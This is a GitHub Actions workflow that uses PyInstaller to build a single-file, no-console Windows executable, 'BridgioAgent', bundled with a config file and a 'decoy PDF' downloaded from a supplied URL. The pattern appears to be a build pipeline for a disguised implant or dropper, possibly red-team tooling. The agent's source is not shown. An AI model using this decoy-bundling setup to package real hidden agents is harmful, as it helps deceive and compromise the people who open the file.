name: Build Agent

on:
  workflow_dispatch:
    inputs:
      pdf_url:
        description: 'URL to download decoy PDF from'
        required: true

jobs:
  build:
    runs-on: windows-latest

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Download decoy PDF
        shell: pwsh
        run: |
          Invoke-WebRequest -Uri "${{ github.event.inputs.pdf_url }}" -OutFile "decoy\decoy.pdf" -UseBasicParsing

      - name: Install dependencies
        run: pip install -r requirements.txt pyinstaller

      - name: Build EXE
        run: |
          pyinstaller --onefile --noconsole `
            --name BridgioAgent `
            --add-data "config.json;." `
            --add-data "decoy;decoy" `
            main.py

      - name: Stage artifact files
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force artifact
          Copy-Item dist\BridgioAgent.exe artifact\
          Copy-Item config.json artifact\

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: BridgioAgent
          path: artifact\
          retention-days: 7
